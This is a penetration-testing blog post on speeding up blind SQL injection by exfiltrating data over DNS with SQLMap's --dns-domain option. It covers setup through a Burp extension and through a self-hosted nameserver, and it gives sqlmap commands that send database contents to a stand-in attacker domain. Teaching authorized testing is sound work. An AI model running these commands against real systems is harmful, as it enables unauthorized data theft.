# Unblinding Blind SQL Injection Using DNS Exfiltration
Jun 3, 2025 12:12:04 PM |

INTRO
-----

I recently came across a blind SQL Injection vulnerability, and my colleague Brett DeWall suggested using the --dns-domain option in SQLMap to speed up data extraction using DNS exfiltration. The traditional method for data extraction with Blind SQL injection is to use a boolean or time-based condition to iterate through all possible characters for every piece of information you wish to retrieve. This means sending roughly 25-50 requests for every single character in a string, which takes a long time even for small pieces of data.

DNS exfiltration provides a solution for this and allows for much more rapid extraction of database values. However, when searching for instructions on how to setup the DNS server to receive these requests, most of the resources I found were lacking in practical exploitation steps. The purpose of this blog post is to provide simple, easy-to-follow steps to use DNS data exfiltration when exploiting a blind SQL injection vulnerability.

SQL Injection DNS Exfiltration
------------------------------

I won’t go into the nitty gritty of how DNS data exfiltration works, as there are many excellent resources on this including the original SQLMap research published here: [https://www.slideshare.net/slideshow/dns-exfiltration-using-sqlmap-13163281/13163281](https://www.slideshare.net/slideshow/dns-exfiltration-using-sqlmap-13163281/13163281). However, the basic idea is that SQL servers hosted on Windows can request a file using a UNC path and a fully-qualified domain name, resulting in a DNS lookup to that domain. Using an attacker-controlled domain/nameservers, those DNS requests can be appended to the subdomain of the DNS lookup, allowing for full strings to be extracted at a time. This means when extracting the table name “users\_tbl”, we would receive a DNS request like:

users\_tbl.attackerserver.com.

Method 1: BurpSuite SQLMap DNS Collaborator
-------------------------------------------

This method is quick and easy to setup, but on the application I was testing it resulted in significant delays and timeouts when attempting to extract data. This technique may work well for other applications though and is great because of how easy it is to setup. If you don’t have a domain purchased or nameservers set up, this is an excellent method to confirm DNS extraction works for your situation.

Requirements
------------

*   BurpSuite Pro

Steps
-----

Start by installing SQLMap DNS Collaborator through the BApp store ([https://portswigger.net/bappstore/e616dc27bf7a4c6598cfeeb70d5ca81c](https://portswigger.net/bappstore/e616dc27bf7a4c6598cfeeb70d5ca81c)).

![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-05-56-1381-PM.png?width=970&height=538&name=image-png-Jun-03-2025-05-05-56-1381-PM.png)

Once it is installed and loaded, go to the Burp Extension Output tab and run SQLMap with the provided --dns-domain:

 ![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-06-05-5884-PM.png?width=966&height=506&name=image-png-Jun-03-2025-05-06-05-5884-PM.png) 

```
sqlmap.py -u "https://yourvulnerabletarget.com" -dbs --dns-domain=p2sawxy30ibxywyze07n883fj6pwdl.oastify.com
```


If it is successful, you should see requests coming through the extension Output tab:

  ![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-06-42-5281-PM.png?width=975&height=400&name=image-png-Jun-03-2025-05-06-42-5281-PM.png)

and SQLMap output verifying data retrieval through the DNS channel (note the “connection timed out” errors I mentioned earlier resulting in slow data exfiltration times):

![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-06-52-3917-PM.png?width=975&height=380&name=image-png-Jun-03-2025-05-06-52-3917-PM.png)

Method 2: Use Your Own Nameserver
---------------------------------

Requirements
------------

To successfully use this method, you need the following:

*   Root/local admin access to an internet facing server with a public IP address/network interface
*   A purchased domain name (I am using GoDaddy to purchase and configure my domain in this example)

Steps
-----

Purchase a domain name through your preferred provider. We will run SQLMap from our server with a public IP address and use SQLMap to parse and process the DNS requests to extract data. This means we don’t need to mess with Bind or configuring a local DNS server or anything like that, but we do need to configure our domain’s nameserver settings to send all DNS requests to our server.

In GoDaddy, this can be done by editing the DNS settings for the purchased domain (we’ll use attackerserver.com for this example). If you try to just create DNS A records for ns1.attackerserver.com and ns2.attackerserver.com, GoDaddy will not let you set the nameservers to these values. Instead, we’ll go to the “Hostnames” tab and create two entries there (you don’t have to use ns1 and ns2, but those are just commonly used for nameserver identifiers):

 ![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-07-04-8177-PM.png?width=975&height=619&name=image-png-Jun-03-2025-05-07-04-8177-PM.png)

Now go to the Nameservers tab and add the two entries you just created:

 ![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-07-11-8087-PM.png?width=975&height=532&name=image-png-Jun-03-2025-05-07-11-8087-PM.png)

Now, on your internet-facing server you should see receive all incoming DNS requests to your domain. This can be verified by running tcpdump:

```
sudo tcpdump -i [interface] udp port 53
```


Now do a nslookup from any other host for any subdomain of your domain (i.e test1234.attackerserver.com):

```
$ nslookup test1234.attackerserver.com
Server:             192.168.123.2
Address:           192.168.123.2#53
```


```
** server can't find test1234.attackerserver.com: SERVFAIL
```


 This should result in you seeing incoming DNS requests on the internet-facing server:

![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-08-11-2383-PM.png?width=974&height=80&name=image-png-Jun-03-2025-05-08-11-2383-PM.png)

The above nslookup fails because we don’t have a DNS server listening on the host. However, if you run SQLMap with the --dns-domain option, it acts as a DNS server and responds to the DNS requests to facilitate the data exfiltration. Now we can run SQLMap on our blind SQLi and get fast data exfiltration (don’t forget sudo so it can listen on port 53/udp).

```
sudo sqlmap.py -u "https://yourvulnerabletarget.com" --dns-domain=attackerserver.com --dbs
```


![](https://blog.cyberadvisors.com/hs-fs/hubfs/image-png-Jun-03-2025-05-08-38-7777-PM.png?width=975&height=417&name=image-png-Jun-03-2025-05-08-38-7777-PM.png)

CONCLUSION
----------

DNS exfiltration is an excellent method for “un-blinding” a blind SQL injection, and the setup to make it work is fairly straightforward. Happy hacking!
